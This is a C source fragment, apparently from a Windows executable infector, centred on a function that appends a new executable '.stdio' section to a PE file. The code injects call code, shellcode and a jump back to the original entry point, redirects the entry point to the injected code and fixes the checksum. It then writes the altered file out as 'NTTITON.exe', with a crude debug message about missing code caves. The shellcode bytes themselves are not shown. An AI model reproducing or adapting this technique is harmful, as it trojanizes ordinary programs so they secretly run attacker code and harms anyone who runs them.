void AddSection(void* lpModule, unsigned long ulModule, unsigned long ulRawSize)
{
	PIMAGE_DOS_HEADER lpDos = (PIMAGE_DOS_HEADER)(lpModule);
	PIMAGE_NT_HEADERS lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpDos + lpDos->e_lfanew);

	if (lpNt->Signature == IMAGE_NT_SIGNATURE)
	{
		unsigned long ulNewImageSize = ulModule + CalculateBoundary(lpNt->OptionalHeader.FileAlignment, ulRawSize);
		if (ulNewImageSize)
		{

			void * lpNewBase = VirtualAlloc(NULL,ulNewImageSize,MEM_COMMIT|MEM_RESERVE,0x40);

			if (lpNewBase)
			{
				PIMAGE_SECTION_HEADER lpLastSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpNewBase + lpDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ((lpNt->FileHeader.NumberOfSections-1)*40));
				PIMAGE_SECTION_HEADER lpNewSection = (PIMAGE_SECTION_HEADER)((unsigned long)lpLastSection + sizeof(IMAGE_SECTION_HEADER));

				unsigned long ulEOF = 0;
				unsigned long ulCheckSum = 0;
				unsigned long ulOldCheckSum = 0;
				unsigned long ulEntryPoint = 0;
				unsigned long ulOffset = 0;


				lpNt = (PIMAGE_NT_HEADERS)((unsigned long)lpNewBase+ lpDos->e_lfanew);

				RtlSecureZeroMemory(lpNewBase,ulNewImageSize);

				m_memcpy(lpNewBase,lpModule,ulModule);
				m_memcpy(&lpNewSection->Name, ".stdio", strlen(".stdio"));


				lpNewSection->SizeOfRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment,ulRawSize);
				lpNewSection->PointerToRawData = CalculateBoundary(lpNt->OptionalHeader.FileAlignment, lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData);
				lpNewSection->VirtualAddress = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpLastSection->VirtualAddress + lpLastSection->Misc.VirtualSize);
				lpNewSection->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);
				lpNewSection->Misc.VirtualSize = ulRawSize;
				lpNt->FileHeader.NumberOfSections++;
				lpNt->OptionalHeader.SizeOfImage = CalculateBoundary(lpNt->OptionalHeader.SectionAlignment, lpNewSection->VirtualAddress + ulRawSize);




				ulEntryPoint = lpNt->OptionalHeader.AddressOfEntryPoint;


				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData), ucCallCode, sizeof(ucCallCode));
				ulOffset = ulEntryPoint - (lpNewSection->VirtualAddress + sizeof(ucCallCode)) - 5;
				m_memcpy(&ucJMP[1],&ulOffset, sizeof(unsigned long));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode)), ucJMP,sizeof(ucJMP));
				m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + sizeof(ucCallCode) + sizeof(ucJMP)), ucShellCode, sizeof(ucShellCode));

				if (ulEOF = GetEOFSize(lpLastSection, ulModule))
				{
					m_memcpy((void*)((unsigned long)lpNewBase + lpNewSection->PointerToRawData + lpNewSection->SizeOfRawData), (void*)((unsigned long)lpModule + (lpLastSection->PointerToRawData + lpLastSection->SizeOfRawData)), ulEOF);
				}

				lpNt->OptionalHeader.AddressOfEntryPoint = (lpNewSection->VirtualAddress);

				if (CheckSumMappedFile(lpNewBase,ulNewImageSize, &ulOldCheckSum, &ulCheckSum))
				{

					lpNt->OptionalHeader.CheckSum = ulCheckSum;
				}



				if (WriteFileBuffer("NTTITON.exe",lpNewBase,ulNewImageSize))
				{
					printf("Had to add section.... no codecaves were available FUUUUCK\n");
				}



				VirtualFree(lpNewBase,ulNewImageSize,MEM_RELEASE);
			}
		}
	}
}